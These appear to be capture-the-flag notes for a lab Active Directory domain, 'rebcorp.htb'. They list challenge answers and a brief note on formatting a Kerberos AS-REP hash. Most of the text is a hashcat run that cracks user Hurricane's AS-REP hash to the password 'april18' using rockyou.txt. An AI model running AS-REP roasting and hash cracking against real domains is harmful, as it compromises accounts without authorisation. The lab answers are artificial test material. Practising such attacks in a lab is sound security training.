'''

Copper
CN=SRV195,OU=Domain Controllers,DC=rebcorp,DC=htb
rebcorp.htb
14
(objectClass=group)
5
Radiation
wWWHomePage
http://rebcorp.htb/qPvAdQ.php
B4ck,Enclave
april18

'''

'''
The first 16bytes (32 char in hex) for token. Algin with kbr5asrep format.
Refer to https://www.tarlogic.com/blog/how-to-attack-kerberos/

hashcat -m 18200 --force -a 0 hash.txt rockyou.txt
hashcat (v6.2.5) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-1185G7 @ 3.00GHz, 2839/5743 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 2 MB

Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

$krb5asrep$23$Hurricane@REBCORP.HTB:d87559a87bea8bebe93b5c067909dbeb$fa371e535597c50cbd0e92b26d2d58a733e0d92b950621dc37a7523611888da6ce0266518cdd5c08b13e050e5487d678feaa30e2910275a1e70912c011b6e408ce448ccc070946089413e9750b7a9685534742f3e43066154a7d06c343b9fc2560da668b9d1dff2cdf9d9fe6791c09c65e3a3064fa128315f3f76cf185d905bdad08acf48a14bfd2ddd5bb8c63f7785b7195ac28f607e2bad049aee6d257cfc0d2f19094c3a9c484145a1949e5fdfb64618b0a61f9b754b50855ab69ba2f48db614eeafebdacab14b4f50e883ef9e78db8be8240461c861e543606358be0ce24982237baaf0d99cc5580:april18

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$Hurricane@REBCORP.HTB:d87559a87bea8be...cc5580
Time.Started.....: Sun May 19 13:49:51 2024, (0 secs)
Time.Estimated...: Sun May 19 13:49:51 2024, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   150.1 kH/s (1.08ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8192/14344384 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344384 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: newzealand -> total90

Started: Sun May 19 13:49:22 2024
Stopped: Sun May 19 13:49:53 2024

'''
